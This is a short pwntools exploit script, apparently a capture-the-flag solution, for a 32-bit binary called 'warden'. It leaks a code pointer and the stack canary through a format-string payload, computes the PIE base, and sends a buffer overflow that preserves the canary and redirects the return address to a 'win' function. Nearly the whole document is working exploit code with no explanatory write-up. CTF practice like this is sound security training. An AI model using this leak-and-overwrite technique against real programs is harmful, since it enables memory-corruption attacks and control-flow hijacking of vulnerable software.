from pwn import *
context.arch = 'i386'

p = process('./warden')
p.recvuntil(b'My defense is too solid to be breached.\n')

# Leak
p.sendline(b'%3$08x|%15$08x')
output = p.recvuntil(b'Pow Pow Pow\n')
values = output.split(b'Pow')[0].strip().split(b'|')
code_leak = int(values[0], 16)
canary = int(values[1], 16)

base = code_leak - 0x1433
braum = base + 0x12cd
win = base + 0x1324
pop_ret = base + 0x1022

print(f"Base: {hex(base)}, Canary: {hex(canary)}")
print(f"braum: {hex(braum)}, win: {hex(win)}")

# Simple test: just call win without setting globals
payload = b'A' * 32
payload += p32(canary)
payload += p32(0)
payload += p32(0)
payload += p32(win)
payload += p32(0)
payload += p32(0x123)

p.sendline(payload)
sleep(0.5)
print("Output:", p.recvrepeat(timeout=1))
p.close()
